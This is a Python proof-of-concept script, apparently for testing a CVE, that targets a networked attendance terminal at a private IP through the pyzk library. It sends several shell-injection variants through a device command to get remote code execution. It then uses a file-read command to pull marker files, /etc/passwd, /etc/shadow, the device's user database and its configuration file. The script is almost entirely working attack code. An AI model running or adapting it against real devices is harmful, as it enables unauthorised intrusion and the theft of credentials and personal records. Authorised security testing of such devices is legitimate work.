#!/usr/bin/env python3
"""Use pyzk's __send_command (works) to test CVE."""
import sys
sys.path.insert(0, 'D:\\chamcong\\AttendanceSuite_Portable\\python\\Lib\\site-packages')
sys.stdout.reconfigure(encoding='utf-8')

import socket, struct, time, random, string
from zk import ZK, const
from struct import pack, unpack

MARKER = "mvs" + ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
print('[*] Marker:', MARKER)

INJECTIONS = [
    'echo ' + MARKER + ' > /tmp/mavis_rce_proof',
    '; echo ' + MARKER + ' > /tmp/mavis_rce_proof2 ;',
    '`echo ' + MARKER + '` > /tmp/mavis_rce_proof3',
    '$(echo ' + MARKER + ') > /tmp/mavis_rce_proof4',
]

def send_cmd(conn, command, data=b''):
    """Send via pyzk's internal method."""
    try:
        r = conn._ZK__send_command(command, data, response_size=1024)
        return r
    except Exception as e:
        return {'status': False, 'error': str(e)}

def cmd_str(c):
    return '0x%04X' % (c or 0)

zk = ZK('172.16.0.214', port=4370, timeout=10, password=0)
conn = zk.connect()
print('[+] Connected:', conn.get_firmware_version(), conn.get_platform())

try:
    conn.disable_device()
except: pass

sock = conn._ZK__sock
session_id = conn._ZK__session_id

print('\n[PHASE 1] Send 4 cmd injection variants via 0x03F5')
for inj_str in INJECTIONS:
    inj_bytes = inj_str.encode() + b'\x00'
    r = send_cmd(conn, 0x03F5, inj_bytes)
    print('  Injection:', inj_str[:60])
    if 'error' in r:
        print('    ERROR:', r['error'])
    else:
        print('    status=', r['status'], 'code=', cmd_str(r.get('code')))

time.sleep(3)

print('\n[PHASE 2] Verify RCE by reading /tmp/mavis_rce_proof* via READFILE 0x6A6')
for marker_file in ['/tmp/mavis_rce_proof', '/tmp/mavis_rce_proof2',
                     '/tmp/mavis_rce_proof3', '/tmp/mavis_rce_proof4']:
    r = send_cmd(conn, 0x6A6, (marker_file + '\x00').encode())
    print('  READ', marker_file, '->', r.get('status', False), 'code=', cmd_str(r.get('code')))

print('\n[PHASE 3] Read /etc/passwd')
r = send_cmd(conn, 0x6A6, b'/etc/passwd\x00')
print('  /etc/passwd ->', r.get('status', False), 'code=', cmd_str(r.get('code')))

print('\n[PHASE 4] Read /etc/shadow')
r = send_cmd(conn, 0x6A6, b'/etc/shadow\x00')
print('  /etc/shadow ->', r.get('status', False), 'code=', cmd_str(r.get('code')))

print('\n[PHASE 5] Read /mnt/mtdblock/data/ZKDB.db')
r = send_cmd(conn, 0x6A6, b'/mnt/mtdblock/data/ZKDB.db\x00')
print('  ZKDB.db ->', r.get('status', False), 'code=', cmd_str(r.get('code')))

print('\n[PHASE 6] Read /mnt/mtdblock/options.cfg')
r = send_cmd(conn, 0x6A6, b'/mnt/mtdblock/options.cfg\x00')
print('  options.cfg ->', r.get('status', False), 'code=', cmd_str(r.get('code')))

print('\n[PHASE 7] Read /etc/passwd via DATA_WRRQ (read_with_buffer)')
try:
    data, size = conn.read_with_buffer(0x6A6, 0, 0)
    print('  size=', size)
    print('  content:', data[:500])
except Exception as e:
    print('  ERROR:', e)

print('\n[PHASE 8] Try reading ZKDB.db via READFILE 0x6A6 with proper handshake')
# Send READFILE then expect PREPARE_DATA + CMD_DATA
try:
    r = send_cmd(conn, 0x6A6, b'/etc/passwd\x00')
    print('  Initial:', r)
    # Try to read more data from socket
    sock.settimeout(5)
    extra = b''
    try:
        while True:
            chunk = sock.recv(8192)
            if not chunk: break
            extra += chunk
            if len(extra) > 100000: break
    except socket.timeout: pass
    print('  Extra data:', extra[:500])
except Exception as e:
    print('  ERROR:', e)

try:
    conn.enable_device()
except: pass
try:
    conn.disconnect()
except: pass
print('\n[+] Done')
